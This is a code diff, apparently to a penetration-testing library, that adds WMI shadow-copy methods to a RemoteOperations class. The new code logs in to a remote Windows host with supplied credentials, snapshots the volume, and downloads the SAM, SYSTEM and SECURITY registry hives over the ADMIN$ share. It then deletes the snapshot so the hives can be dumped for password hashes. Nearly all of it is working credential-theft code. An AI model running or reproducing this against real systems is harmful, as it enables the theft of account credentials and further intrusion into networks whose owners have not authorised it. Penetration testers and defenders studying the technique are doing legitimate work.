@@ -777,6 +777,10 @@ class RemoteOperations:
                 LOG.error(e)
             return None
 
+    def __getSCManagerHandle(self):
+        ans = scmr.hROpenSCManagerW(self.__scmr)
+        self.__scManagerHandle = ans['lpScHandle']
+
     def __checkServiceStatus(self):
         # Open SC Manager
         ans = scmr.hROpenSCManagerW(self.__scmr)
@@ -1053,6 +1057,41 @@ class RemoteOperations:
 
         dcom.disconnect()
 
+    def __wmiCreateShadow(self, volume):
+        username, password, domain, lmhash, nthash, aesKey, _, _ = self.__smbConnection.getCredentials()
+        dcom = DCOMConnection(self.__smbConnection.getRemoteHost(), username, password, domain, lmhash, nthash, aesKey,
+                              oxidResolver=False, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
+        iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,wmi.IID_IWbemLevel1Login)
+        iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
+        iWbemServices= iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
+        iWbemLevel1Login.RemRelease()
+
+        win32ShadowCopy,_ = iWbemServices.GetObject('Win32_ShadowCopy')
+        LOG.debug('Trying to create SS remotely via WMI')
+        result = win32ShadowCopy.Create(volume, 'ClientAccessible')
+
+        shadowId = result.ShadowID
+        LOG.debug('Got ShadowID %s' % shadowId)
+
+        dcom.disconnect()
+
+        return shadowId
+
+    def __wmiDeleteShadow(self, ssID):
+        username, password, domain, lmhash, nthash, aesKey, _, _ = self.__smbConnection.getCredentials()
+        dcom = DCOMConnection(self.__smbConnection.getRemoteHost(), username, password, domain, lmhash, nthash, aesKey,
+                              oxidResolver=False, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
+        iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,wmi.IID_IWbemLevel1Login)
+        iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
+        iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
+        iWbemLevel1Login.RemRelease()
+
+        wmiPath = 'Win32_ShadowCopy.ID="%s"' % ssID
+        LOG.debug('Trying to delete ShadowCopy')
+        iWbemServices.DeleteInstance(wmiPath)
+
+        dcom.disconnect()
+
     def __executeRemote(self, data):
         self.__tmpServiceName = ''.join([random.choice(string.ascii_letters) for _ in range(8)])
         command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' > ' + self.__batchFile + ' & ' + \
@@ -1195,6 +1234,34 @@ class RemoteOperations:
         remoteFileName = RemoteFile(self.__smbConnection, 'Temp\\%s' % tmpFileName)
 
         return remoteFileName
+
+    def createSSandDownload(self, volume, localPath):
+        LOG.info('Creating SS')
+        ssID = self.__wmiCreateShadow(volume)
+        LOG.info('Getting SMB equivalent PATH to access remotely the SS')
+        gmtSMBPath = self.__smbConnection.listSnapshots(self.__smbConnection.connectTree('ADMIN$'), '/')[0]
+        LOG.debug('Got SMB GMT Path: %s' % gmtSMBPath)
+        LOG.debug('Performed SS via WMI and got info')
+
+        if self.__execMethod == 'smbexec':
+            self.__connectSvcCtl()
+            self.__getSCManagerHandle()
+
+        # Array of tuples of (local path to download, remote path of file)
+        paths = [('%s/SAM' % localPath, '%s\\System32\\config\\SAM' % gmtSMBPath),
+                 ('%s/SYSTEM' % localPath, '%s\\System32\\config\\SYSTEM' % gmtSMBPath),
+                 ('%s/SECURITY' % localPath, '%s\\System32\\config\\SECURITY' % gmtSMBPath)]
+
+        for p in paths:
+            with open(p[0], 'wb') as local_file:
+                self.__smbConnection.getFile('ADMIN$', p[1], local_file.write)
+
+        # Return a list of the local paths where SAM, SYSTEM and SECURITY were downloaded
+        LOG.debug('Trying to delete ShadowSnapshot')
+        self.__wmiDeleteShadow(ssID)
+
+        LOG.debug('Downloaded SAM, SYSTEM and SECURITY from Shadow Snapshot. Dumping...')
+        return list(zip(*paths))[0]
 
 class CryptoCommon:
     # Common crypto stuff used over different classes
